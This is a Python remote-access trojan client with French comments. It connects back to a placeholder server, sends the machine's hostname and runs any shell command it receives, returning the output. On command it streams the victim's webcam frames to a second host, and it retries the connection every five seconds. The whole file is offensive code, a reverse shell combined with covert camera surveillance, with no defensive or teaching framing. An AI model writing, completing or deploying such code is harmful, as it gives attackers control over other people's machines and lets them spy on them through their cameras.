import socket
import subprocess
import os
import time
import cv2
import struct
import pickle

HOST = 'ipduserver'
PORT = 669

def execute_command(command):
    try:
        print(command)
        if "start" in command:
            subprocess.Popen(command, shell=True)
            return f"Commande '{command}' démarrée en arrière-plan"
        else:
            process = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
            return process.stdout + process.stderr
    except subprocess.TimeoutExpired:
        return "La commande a dépassé le délai d'exécution"
    except Exception as e:
        return f"Erreur lors de l'exécution de la commande: {str(e)}"

def handle_command(client_socket, command):
    try:
        output = execute_command(command)
        client_socket.sendall(output.encode())
    except Exception as e:
        client_socket.sendall(f"Erreur lors de l'exécution de la commande: {str(e)}".encode())





def stream_camera():
    server_ip = 'ip'  # Laisser '0.0.0.0' pour accepter toutes les connexions
    server_port = 670
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    # Capture vidéo avec OpenCV
    cap = cv2.VideoCapture(0)
    while cap.isOpened():
        ret, frame = cap.read()
        if not ret:
            break

        # Sérialiser l'image avec pickle
        data = pickle.dumps(frame)
        # Préfixer avec la taille du message
        message_size = struct.pack("L", len(data))

        # Envoyer la taille et ensuite l'image
        client_socket.sendall(message_size + data)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    client_socket.close()
    cv2.destroyAllWindows()
























def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))
            
            hostname = socket.gethostname()
            client.send(hostname.encode())
            print(f"Connecté au serveur {HOST}:{PORT}")
            
            while True:
                command_type = client.recv(1024)
                if not command_type:
                    break
                
                if command_type == b'cmd':
                    command = client.recv(1024).decode()
                    print(f"Commande reçue: {command}")
                    handle_command(client, command)
                elif command_type == b'cam':
                    print("Demande de streaming caméra reçue")
                    stream_camera()
                elif command_type == b'ping':
                    client.send(b'pong')
                else:
                    print(f"Commande inconnue reçue: {command_type}")
            
            client.close()
        except socket.error as e:
            print(f"Erreur de connexion: {str(e)}")
            print("Tentative de reconnexion dans 5 secondes...")
            time.sleep(5)
        except Exception as e:
            print(f"Erreur inattendue: {str(e)}")
            print("Tentative de reconnexion dans 5 secondes...")
            time.sleep(5)

if __name__ == "__main__":
    connect_to_server()
